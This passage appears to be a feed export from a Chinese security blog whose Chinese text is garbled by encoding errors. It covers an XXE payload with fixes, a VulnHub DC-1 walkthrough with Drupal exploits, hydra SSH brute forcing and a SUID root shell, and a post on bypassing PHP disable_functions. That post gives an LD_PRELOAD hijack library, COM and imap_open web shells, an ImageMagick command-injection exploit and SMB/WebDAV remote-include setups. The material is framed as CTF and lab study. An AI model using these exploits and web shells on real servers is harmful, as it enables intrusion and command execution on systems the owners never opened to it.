class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ELEMENT message ANY&gt;</span><br><span class="line">    &lt;!ENTITY % remote SYSTEM &quot;&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % para1 SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % ISOamso &#39;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;para2;</span><br><span class="line">    &#39;&gt;</span><br><span class="line">    %remote;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;10&lt;&#x2F;message&gt;</span><br></pre></td></tr></table></figure><p>è¿˜ä¸å¤ªæ‡‚ï¼ï¼ï¼ï¼</p><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>ä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•<br>PHPï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure><p>Libxml2.9.0 ä»¥å ï¼Œé»˜è®¤ä¸è§£æå¤–éƒ¨å®ä½“</p><p>JAVA:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf &#x3D;DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br></pre></td></tr></table></figure><p>Pythonï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from lxml import etree</span><br><span class="line">xmlData &#x3D; etree.parse(xmlSource,etree.XMLParser(resolve_entities&#x3D;False))</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤ç”¨æˆ·æäº¤çš„XMLæ•°æ®</p><p>è¿‡æ»¤å…³é”®è¯ï¼š<code>&lt;!DOCTYPE</code>å’Œ<code>&lt;!ENTITY</code>ï¼Œæˆ–è€…<code>SYSTEM</code>å’Œ<code>PUBLIC</code></p><p>å‚è€ƒï¼š<br><a href="https://xz.aliyun.com/t/3357">å¥½æ–‡ï¼Œä½œè€…æœ‰å¿ƒäº†ï¼ï¼ï¼</a></p><p><a href="https://www.freebuf.com/vuls/207639.html">https://www.freebuf.com/vuls/207639.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
            <tag> xxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHubä¹‹DC-1é¶æœº</title>
      <link href="2019/12/12/vulnhub-dc-1/"/>
      <url>2019/12/12/vulnhub-dc-1/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦è®°å½•ä¸€ä¸‹ç©VulnHubä¸Šçš„DC-1é¶æœºçš„è¿‡ç¨‹ï¼ï¼ï¼</p><a id="more"></a><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>æœ¬åœ°é…å¥½ç¯å¢ƒï¼Œè¿™é‡Œç½‘ç»œè¿æ¥æˆ‘ç”¨çš„æ˜¯NATæ–¹å¼</p><p><strong>é¶æœºï¼š</strong>192.168.17.149</p><p><strong>kaliï¼š</strong>192.168.17.146</p><p>äº‹å…ˆä¸çŸ¥é“ipçš„è¯å¯ä»¥å…ˆç”¨arp-scanæ‰«ä¸€ä¸‹</p><pre><code>arp-scan --interface=eth0 --localnet</code></pre><p><img src="/2019/12/12/vulnhub-dc-1/20191212224352.png"></p><p>nmapæ‰«ä¸‹çœ‹å¼€æ”¾äº†å“ªäº›ç«¯å£</p><p><img src="/2019/12/12/vulnhub-dc-1/20191212225050.png"></p><p>80ç«¯å£å¼€æ”¾ï¼Œè®¿é—®ä»¥ä¸‹ç½‘ç«™</p><p><img src="/2019/12/12/vulnhub-dc-1/20191212225147.png"></p><p>çœ‹åˆ°æ˜¯Drupalçš„cmsï¼Œæ‰“å¼€msfï¼Œsearchä¸€ä¸‹ï¼Œç”¨æœ€æ–°çš„<code>exploit(unix/webapp/drupal_drupalgeddon2)</code>ï¼ŒæˆåŠŸè¿”å›meterpreterï¼Œè¿›å…¥shellï¼Œæ‰§è¡Œå‘½ä»¤è¿›å…¥ä¸€ä¸ªæ ‡å‡†çš„shellï¼Œlså¾—åˆ°flag1ï¼ŒæŸ¥çœ‹å†…å®¹</p><pre><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></pre><p><img src="/2019/12/12/vulnhub-dc-1/20191212225948.png"></p><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>æç¤ºè®©æˆ‘ä»¬çœ‹é…ç½®æ–‡ä»¶ï¼Œæœä¸€ä¸‹é…ç½®æ–‡ä»¶ä½ç½®<code>/sites/default/settings.php</code></p><p>å¾—åˆ°flag2å’Œæ•°æ®åº“è´¦å·å¯†ç </p><p><img src="/2019/12/12/vulnhub-dc-1/20191212230758.png"></p><h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>ç™»é™†ä¸€ä¸‹mysql</p><pre><code>mysql -h localhost -u dbuser -p</code></pre><p><img src="/2019/12/12/vulnhub-dc-1/20191213133233.png"></p><p>æŸ¥çœ‹drupaldbé‡Œusersè¡¨é‡Œçš„å†…å®¹</p><p><img src="/2019/12/12/vulnhub-dc-1/20191213135445.png"></p><p>æœ‰ä¸¤ç§æ–¹æ³•ï¼š</p><p><strong>æ–¹å¼1ï¼š</strong></p><p>ç”¨åŒæ ·çš„åŠ å¯†æ–¹å¼åŠ å¯†ä¸€ä¸ªæˆ‘ä»¬çŸ¥é“çš„å¯†é’¥ï¼Œç„¶åupdateæ•°æ®åº“ä¿®æ”¹åŸå¯†ç ï¼Œåœ¨Drupal7é¡¹ç›®æ‰€åœ¨çš„ç›®å½•ç”¨ä»¥ä¸‹å‘½ä»¤å³å¯è·å¾—åŠ å¯†ç»“æœ</p><pre><code>php scripts/password-hash.sh admin</code></pre><p><img src="/2019/12/12/vulnhub-dc-1/20191213140253.png"></p><p>ç„¶åå†æ•°æ®åº“é‡Œæ›´æ–°</p><pre><code>update users set pass=&quot;$S$DsBR4rNeiIzheuLDAdLE932hUtDgoeE6BFmP2oRifCt.4piniN7u&quot; where name=&quot;admin&quot;;</code></pre><p><img src="/2019/12/12/vulnhub-dc-1/20191213141024.png"></p><p>ç™»é™†ä¸€ä¸‹ï¼Œåœ¨Dashboardå‘ç°flag3ï¼Œæç¤ºæˆ‘ä»¬passwd</p><p><img src="/2019/12/12/vulnhub-dc-1/20191213141259.png"></p><p><strong>æ–¹å¼2ï¼š</strong></p><p>æŸ¥çœ‹ä¸‹Drupalçš„ç‰ˆæœ¬ï¼Œ<code>includes/bootstrap.inc</code>æ˜¯é»˜è®¤çš„ç‰ˆæœ¬ä¿¡æ¯</p><pre><code>cat /var/www/includes/bootstrap.inc | grep VERSION</code></pre><p><img src="/2019/12/12/vulnhub-dc-1/20191213142543.png"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯7.24çš„ç‰ˆæœ¬ï¼Œsearchsploitæœç´¢ä¸€ä¸‹</p><p><img src="/2019/12/12/vulnhub-dc-1/20191213143008.png"></p><p>å‘ç°å¥½åƒæœ‰sqlæ³¨å…¥æ¼æ´ï¼Œç›´æ¥ç”¨<code>exp(/usr/share/exploitdb/exploits/php/webapps/34992.py)</code></p><pre><code>python /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.17.149/ -u moonback -p moonback</code></pre><p><img src="/2019/12/12/vulnhub-dc-1/20191213143624.png"></p><p>æˆ‘ä»¬å°±æˆåŠŸåˆ›å»ºä¸€ä¸ªå’Œadminä¸€æ ·çš„ç”¨æˆ·ï¼Œå…¶ä»–çš„expåº”è¯¥ä¹Ÿå¯ä»¥ç”¨ï¼Œæ²¡æœ‰æµ‹è¯•</p><h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>è·Ÿç€flag3çš„æç¤ºï¼Œçœ‹çœ‹<code>/etc/passwd</code>å§ï¼Œæ‰¾åˆ°flag4ï¼Œå­˜åœ¨flag4ç”¨æˆ·</p><p><img src="/2019/12/12/vulnhub-dc-1/20191213144626.png"></p><p>ä¼šä¸ä¼šæ˜¯å¼±å£ä»¤ï¼Ÿç”¨hydraçˆ†ç ´ä¸€ä¸‹å§</p><pre><code>hydra -l flag4 -P /root/Desktop/å­—å…¸/pass.txt ssh://192.168.17.149 -t 64</code></pre><p><img src="/2019/12/12/vulnhub-dc-1/20191213150235.png"><br>æœ€åçˆ†ç ´å‡ºæ¥çš„æ˜¯orangeï¼Œsshç™»ä¸Š,å¾—åˆ°flag4ï¼Œæç¤ºä¸‹ä¸€ä¸ªflagåœ¨<code>/root</code>ç›®å½•ä¸‹</p><p><img src="/2019/12/12/vulnhub-dc-1/20191213150425.png"></p><h2 id="thefinalflag"><a href="#thefinalflag" class="headerlink" title="thefinalflag"></a>thefinalflag</h2><p>ææƒå§ï¼æç¤ºä¹Ÿç»™äº†ç”¨findææƒï¼ˆsuidææƒï¼‰</p><pre><code>find / -user root -perm -4000 -print 2&gt;/dev/nullfind / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;     #æŸ¥çœ‹å…·æœ‰rootç”¨æˆ·æƒé™çš„SUIDæ–‡ä»¶</code></pre><p>å‘ç°findå‘½ä»¤åœ¨é‡Œé¢ï¼Œsuidææƒçš„å¤§æ¦‚æ„æ€å°±æ˜¯ï¼šå¦‚æœå‘½ä»¤ä»¥SUIDæƒé™è¿è¡Œï¼Œæ‰€æœ‰é€šè¿‡è¯¥å‘½ä»¤æ‰§è¡Œçš„å‘½ä»¤éƒ½ä¼šä»¥rootæƒé™è¿è¡Œ</p><pre><code>find /etc/passwd -exec whoami \;</code></pre><p><img src="/2019/12/12/vulnhub-dc-1/20191213151722.png"></p><p>æ‰€ä»¥æˆ‘ä»¬ç›´æ¥è®©å®ƒå¼¹ä¸ªrootçš„shell</p><pre><code>find /etc/passwd -exec /bin/sh \;</code></pre><p><img src="/2019/12/12/vulnhub-dc-1/20191213152233.png"></p><p>æˆåŠŸé€šå…³ï¼ï¼ï¼</p>]]></content>
      
      
      
        <tags>
            
            <tag> VulnHub </tag>
            
            <tag> é¶æœº </tag>
            
            <tag> MSF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç»•è¿‡phpéƒ¨åˆ†é…ç½®</title>
      <link href="2019/11/29/bypass-php-ini/"/>
      <url>2019/11/29/bypass-php-ini/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä»‹ç»äº†ç»•è¿‡ä¸€äº›phpé…ç½®çš„æ–¹æ³•ï¼</p><a id="more"></a><h2 id="bypass-disable-functions"><a href="#bypass-disable-functions" class="headerlink" title="bypass disable_functions"></a>bypass disable_functions</h2><p>é¡¾åæ€ä¹‰ï¼Œ<code>disable_functions</code>å³ä¸èƒ½ä½¿ç”¨çš„phpå‡½æ•°</p><h3 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h3><p><code>LD_PRELOAD</code>æ˜¯Linuxä¸­çš„ç¯å¢ƒå˜é‡ï¼Œå¯ä»¥è®¾ç½®æˆä¸€ä¸ªæŒ‡å®šåº“çš„è·¯å¾„ï¼ŒåŠ¨æ€é“¾æ¥æ—¶è¾ƒå…¶ä»–åº“æœ‰ç€æ›´é«˜çš„ä¼˜å…ˆçº§ï¼Œå…è®¸é¢„åŠ è½½æŒ‡å®šåº“ä¸­çš„å‡½æ•°å’Œç¬¦å·è¦†ç›–æ‰åç»­é“¾æ¥çš„åº“ä¸­çš„å‡½æ•°å’Œç¬¦å·</p><p>phpçš„<code>mail()</code>å‡½æ•°åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ä¼šé»˜è®¤è°ƒç”¨ç³»ç»Ÿç¨‹åº<code>/usr/sbin/sendmail</code>ï¼Œè€Œ<code>/usr/sbin/sendmail</code>ä¼šè°ƒç”¨<code>getuid()</code>ã€‚å¦‚æœæˆ‘ä»¬èƒ½é€šè¿‡LD_PRELOADçš„æ–¹å¼æ¥åŠ«æŒ<code>getuid()</code>ï¼Œå†ç”¨<code>mail()</code>å‡½æ•°æ¥è§¦å‘sendmailç¨‹åºè¿›è€Œæ‰§è¡Œè¢«åŠ«æŒçš„<code>getuid()</code>ï¼Œä»è€Œå°±èƒ½æ‰§è¡Œæ¶æ„ä»£ç äº†</p><p>æ‹ä¸‹æ€è·¯ï¼š</p><ol><li>ç¼–å†™ä¸€ä¸ªåŸå‹ä¸º <code>uid_t getuid(void);</code> çš„ C å‡½æ•°ï¼Œå†…éƒ¨æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„ä»£ç ï¼Œå¹¶ç¼–è¯‘æˆå…±äº«å¯¹è±¡ <code>evil.so</code></li><li>è¿è¡Œ PHP å‡½æ•° <code>putenv()</code>ï¼Œè®¾å®šç¯å¢ƒå˜é‡ <code>LD_PRELOAD</code> ä¸º <code>evil.so</code>ï¼Œä»¥ä¾¿åç»­å¯åŠ¨æ–°è¿›ç¨‹æ—¶ä¼˜å…ˆåŠ è½½è¯¥å…±äº«å¯¹è±¡</li><li>è¿è¡Œ PHP çš„ mail() å‡½æ•°ï¼Œmail() å†…éƒ¨å¯åŠ¨æ–°è¿›ç¨‹ <code>/usr/sbin/sendmail</code>ï¼Œç”±äºä¸Šä¸€æ­¥ <code>LD_PRELOAD</code> çš„ä½œç”¨ï¼Œ<code>sendmail</code> è°ƒç”¨çš„ç³»ç»Ÿå‡½æ•° <code>getuid()</code> è¢«ä¼˜å…ˆçº§æ›´å¥½çš„ <code>evil.so</code> ä¸­çš„åŒå <code>getuid()</code> æ‰€åŠ«æŒ</li><li>è¾¾åˆ°ä¸è°ƒç”¨ PHP çš„å„ç§å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼ˆ<code>system()</code>ã€<code>exec()</code> ç­‰ç­‰ï¼‰ä»å¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„ç›®çš„</li></ol><p>æ€æ ·ç¼–å†™ä¸€ä¸ªå…±äº«åº“æ–‡ä»¶å‘¢ï¼Ÿ</p><p>ç¼–å†™<code>test.c</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int geteuid() &#123;</span><br><span class="line">        const char* cmdline &#x3D; getenv(&quot;EVIL_CMDLINE&quot;);</span><br><span class="line">        if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123; return 0; &#125;</span><br><span class="line">        unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">        system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘ç”Ÿæˆå…±äº«åº“æ–‡ä»¶ï¼š</p><pre><code>gcc -shared -fPIC test.c -o test.so</code></pre><p>ç»•è¿‡<code>disable_functions</code> githubä¸Šæœ‰ä¸ªé¡¹ç›®</p><p>EXPåœ°å€ï¼š<a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell">https://github.com/l3m0n/Bypass_Disable_functions_Shell</a></p><p>è¿™é‡Œé¢çš„ä»“åº“é‡Œæœ‰ç¼–è¯‘ç”Ÿæˆå¥½çš„å…±äº«åº“æ–‡ä»¶ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œé€šè¿‡è®¾ç½®<code>EVIL_CMDLINE</code>æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p><p>phpåˆ©ç”¨ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">putenv(&#39;EVIL_CMDLINE&#x3D;&#39;.&#39;cd &#x2F;%26%26.&#x2F;readflag &gt; &#x2F;tmp&#x2F;moonback1 2&gt;%261&#39;);&#x2F;&#x2F;EVIL_CMDLINE&#x3D;shellå‘½ä»¤ï¼Œå¹¶å°†ç»“æœè¾“å‡ºåˆ°ä¸€ä¸ªæ–‡ä»¶</span><br><span class="line">putenv(&#39;LD_PRELOAD&#x3D;&#39;.&#39;&#x2F;tmp&#x2F;bypass_disablefunc_x64.so&#39;);&#x2F;&#x2F;LD_PRELOAD&#x3D;åŠ¨æ€åŠ è½½åº“çš„ä½ç½®</span><br><span class="line">mail(&#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;);&#x2F;&#x2F;ç”¨mailå‡½æ•°è§¦å‘</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¿™ä¸Šé¢æœ‰é“é¢˜ï¼ˆRCE meï¼‰æˆ‘ç”¨çš„å°±æ˜¯ç”¨çš„è¿™ç§æ–¹æ³•<a href="http://www.moonback.xyz/2019/11/06/syc-ctf-wp/">http://www.moonback.xyz/2019/11/06/syc-ctf-wp/</a></p><h3 id="COMç»„ä»¶"><a href="#COMç»„ä»¶" class="headerlink" title="COMç»„ä»¶"></a>COMç»„ä»¶</h3><p>éœ€è¦phpé…ç½®é‡Œå¼€å¯com.allow_dcomï¼Œåœ¨php/ext/é‡Œé¢æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨php_com_dotnet.dllè¿™ä¸ªæ–‡ä»¶</p><pre><code>extension=php_com_dotnet.dllcom.allow_dcom = true</code></pre><p>EXP:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$command &#x3D; $_GET[&#39;cmd&#39;];</span><br><span class="line">$wsh &#x3D; new COM(&#39;WScript.shell&#39;); &#x2F;&#x2F; ç”Ÿæˆä¸€ä¸ªCOMå¯¹è±¡ã€€Shell.Applicationä¹Ÿèƒ½</span><br><span class="line">$exec &#x3D; $wsh-&gt;exec(&quot;cmd &#x2F;c&quot;.$command); &#x2F;&#x2F;è°ƒç”¨å¯¹è±¡æ–¹æ³•æ¥æ‰§è¡Œå‘½ä»¤</span><br><span class="line">$stdout &#x3D; $exec-&gt;StdOut();</span><br><span class="line">$stroutput &#x3D; $stdout-&gt;ReadAll();</span><br><span class="line">echo $stroutput;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œåˆ›å»ºä¸€ä¸ªCOMå¯¹è±¡ï¼Œç„¶åé€šè¿‡è°ƒç”¨COMå¯¹è±¡çš„exec()æ–¹æ³•æ¥å®ç°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œä»è€Œç»•è¿‡disable_functionsç¦ç”¨PHPå‘½ä»¤æ‰§è¡Œå‡½æ•°çš„é™åˆ¶</p><h3 id="imap-open-CVE-2018-19518"><a href="#imap-open-CVE-2018-19518" class="headerlink" title="imap_open(CVE-2018-19518)"></a>imap_open(CVE-2018-19518)</h3><p>åœ¨php.iniä¸­å¼€å¯<code>imap.enable_insecure_rsh</code>é€‰é¡¹ä¸ºOn</p><p>å…·ä½“åŸç†å‚è§è¿™ä½å¤§ä½¬çš„åšå®¢ï¼š<a href="https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/#0x07-%E5%88%A9%E7%94%A8imap-open-%E7%BB%95%E8%BF%87">https://www.mi1k7ea.com/2019/06/02/æµ…è°ˆå‡ ç§Bypass-disable-functionsçš„æ–¹æ³•/#0x07-åˆ©ç”¨imap-open-ç»•è¿‡</a></p><p>EXP:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if (!function_exists(&#39;imap_open&#39;)) &#123;</span><br><span class="line">        die(&quot;no imap_open function!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$server &#x3D; &quot;x -oProxyCommand&#x3D;echo\t&quot; . base64_encode($_GET[&#39;cmd&#39;] . &quot;&gt;&#x2F;tmp&#x2F;cmd_result&quot;) . &quot;|base64\t-d|sh&#125;&quot;;</span><br><span class="line">&#x2F;&#x2F;$server &#x3D; &#39;x -oProxyCommand&#x3D;echo$IFS$()&#39; . base64_encode($_GET[&#39;cmd&#39;] . &quot;&gt;&#x2F;tmp&#x2F;cmd_result&quot;) . &#39;|base64$IFS$()-d|sh&#125;&#39;;</span><br><span class="line">imap_open(&#39;&#123;&#39; . $server . &#39;:143&#x2F;imap&#125;INBOX&#39;, &#39;&#39;, &#39;&#39;); &#x2F;&#x2F; or var_dump(&quot;\n\nError: &quot;.imap_last_error());</span><br><span class="line">sleep(5);</span><br><span class="line">echo file_get_contents(&quot;&#x2F;tmp&#x2F;cmd_result&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h3><p>è¿™é‡Œç›´æ¥ä¸ŠEXP:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Disable functions: &quot; . ini_get(&quot;disable_functions&quot;) . &quot;\n&quot;;</span><br><span class="line">$command &#x3D; isset($_GET[&#39;cmd&#39;]) ? $_GET[&#39;cmd&#39;] : &#39;id&#39;;</span><br><span class="line">echo &quot;Run command: $command\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&quot;;</span><br><span class="line">$data_file &#x3D; tempnam(&#39;&#x2F;tmp&#39;, &#39;img&#39;);</span><br><span class="line">$imagick_file &#x3D; tempnam(&#39;&#x2F;tmp&#39;, &#39;img&#39;);</span><br><span class="line">$exploit &#x3D; &lt;&lt;&lt;EOF</span><br><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#39;url(https:&#x2F;&#x2F;127.0.0.1&#x2F;image.jpg&quot;|$command&gt;$data_file&quot;)&#39;</span><br><span class="line">pop graphic-context</span><br><span class="line">EOF;</span><br><span class="line">file_put_contents(&quot;$imagick_file&quot;, $exploit);</span><br><span class="line">$thumb &#x3D; new Imagick();</span><br><span class="line">$thumb-&gt;readImage(&quot;$imagick_file&quot;);</span><br><span class="line">$thumb-&gt;writeImage(tempnam(&#39;&#x2F;tmp&#39;, &#39;img&#39;));</span><br><span class="line">$thumb-&gt;clear();</span><br><span class="line">$thumb-&gt;destroy();</span><br><span class="line">echo file_get_contents($data_file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="bypass-allow-url-include"><a href="#bypass-allow-url-include" class="headerlink" title="bypass allow_url_include"></a>bypass allow_url_include</h2><p><code>all_url_include</code>å³æ˜¯å¦å…è®¸è¿œç¨‹åŒ…å«ï¼Œé»˜è®¤å…³é—­</p><h3 id="SMBæœåŠ¡"><a href="#SMBæœåŠ¡" class="headerlink" title="SMBæœåŠ¡"></a>SMBæœåŠ¡</h3><p>å®‰è£…SAMBAæœåŠ¡å™¨</p><pre><code>apt-get install samba</code></pre><p>åˆ›å»ºå…±äº«ç›®å½•</p><pre><code>mkdir /smbchmod 0555 /smb/chown -R nobody:nogroup /smb/</code></pre><p>é…ç½®SAMBAæœåŠ¡å™¨é…ç½®æ–‡ä»¶</p><pre><code>echo &gt; /etc/samba/smb.conf</code></pre><p>å…¶ä¸­å†™å…¥ä»¥ä¸‹å†…å®¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">workgroup &#x3D; WORKGROUP</span><br><span class="line">server string &#x3D; Samba Server %v</span><br><span class="line">netbios name &#x3D; indishell-lab</span><br><span class="line">security &#x3D; user</span><br><span class="line">map to guest &#x3D; bad user</span><br><span class="line">name resolve order &#x3D; bcast host</span><br><span class="line">dns proxy &#x3D; no</span><br><span class="line">bind interfaces only &#x3D; yes</span><br><span class="line"></span><br><span class="line">[ethan]</span><br><span class="line">path &#x3D; &#x2F;smb</span><br><span class="line">writable &#x3D; no</span><br><span class="line">guest ok &#x3D; yes</span><br><span class="line">guest only &#x3D; yes</span><br><span class="line">read only &#x3D; yes</span><br><span class="line">directory mode &#x3D; 0555</span><br><span class="line">force user &#x3D; nobody</span><br></pre></td></tr></table></figure><p>é‡å¯æœåŠ¡</p><pre><code>service smbd restart </code></pre><p>è®¿é—®å°±å¯ä»¥é€šè¿‡<code>\\192.168.23.129\ethan\shell.php</code></p><h3 id="Webdav"><a href="#Webdav" class="headerlink" title="Webdav"></a>Webdav</h3><p>å¯ä»¥åœ¨dockeré‡Œæ­ä¸€ä¸ª</p><pre><code>docker run -v /root/webdav:/var/lib/dav -e ANONYMOUS_METHODS=GET,OPTIONS,PROPFIND -e LOCATION=/webdav -p 8000:80 --rm --name webdav bytemark/webdav</code></pre><p>ç„¶åæŠŠphpæ–‡ä»¶æ”¾åˆ°<code>/root/webdav/data/</code>é‡Œé¢ï¼ŒåŒ…å«<code>//ip:8000//webdav/shell.php</code>å°±è¡Œ</p><h2 id="bypass-open-basedir"><a href="#bypass-open-basedir" class="headerlink" title="bypass open_basedir"></a>bypass open_basedir</h2><p><code>open_basedir</code>å³ç”¨æ¥å¯¹ç”¨æˆ·è®¿é—®æ–‡ä»¶çš„æ´»åŠ¨èŒƒå›´é™åˆ¶åœ¨æŒ‡å®šçš„åŒºåŸŸ</p><p>å…·ä½“å†…å®¹å¯ä»¥å‚è§å¤§ä½¬çš„åšå®¢<a href="https://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/">https://www.mi1k7ea.com/2019/07/20/æµ…è°ˆå‡ ç§Bypass-open-basedirçš„æ–¹æ³•/</a></p><h3 id="glob-ä¼ªåè®®"><a href="#glob-ä¼ªåè®®" class="headerlink" title="glob://ä¼ªåè®®"></a>glob://ä¼ªåè®®</h3><h3 id="symlink-å‡½æ•°"><a href="#symlink-å‡½æ•°" class="headerlink" title="symlink()å‡½æ•°"></a>symlink()å‡½æ•°</h3>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
            <tag> bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shellå’Œåå¼¹shell</title>
      <link href="2019/11/27/reverse-shell/"/>
      <url>2019/11/27/reverse-shell/</url>
      
